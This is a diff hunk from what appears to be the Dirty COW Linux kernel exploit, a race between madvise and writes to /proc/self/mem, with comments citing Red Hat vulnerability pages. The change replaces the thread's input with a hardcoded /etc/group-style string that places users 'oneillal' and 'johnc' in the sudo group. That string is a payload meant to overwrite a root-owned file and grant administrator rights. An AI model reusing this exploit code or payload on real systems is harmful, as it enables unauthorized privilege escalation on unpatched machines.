@@ -50,7 +50,8 @@ You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vu
 void *procselfmemThread(void *arg)
 {
   char *str;
-  str=(char*)arg;
+//str=(char*)arg;
+  str="root:x:0:\ndaemon:x:1:\nbin:x:2:\nsys:x:3:\nadm:x:4:syslog,oneillal\ntty:x:5:\ndisk:x:6:\nlp:x:7:\nmail:x:8:\nnews:x:9:\nuucp:x:10:\nman:x:12:\nproxy:x:13:\nkmem:x:15:\ndialout:x:20:\nfax:x:21:\nvoice:x:22:\ncdrom:x:24:oneillal\nfloppy:x:25:\ntape:x:26:\nsudo:x:27:oneillal,johnc\naudio:x:29:\ndip:x:30:oneillal\nwww-data:x:33:\nbackup:x:34:\noperator:x:37:\nlist:x:38:\nirc:x:39:\nsrc:x:40:\ngnats:x:41:\nshadow:x:42:\nutmp:x:43:\nvideo:x:44:\nsasl:x:45:\nplugdev:x:46:oneillal\nstaff:x:50:\ngames:x:60:\nusers:x:100:\nnogroup:x:65534:\nlibuuid:x:101:\nnetdev:x:102:\ncrontab:x:103:\nsyslog:x:104:\nfuse:x:105:\nmessagebus:x:106:\nmlocate:x:107:\nssh:x:108:\nlandscape:x:109:\noneillal:x:1000:\nlpadmin:x:110:oneillal\njohnc:x:1001:\n";
 /*
 You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
 >  The in the wild exploit we are aware of doesn't work on Red Hat
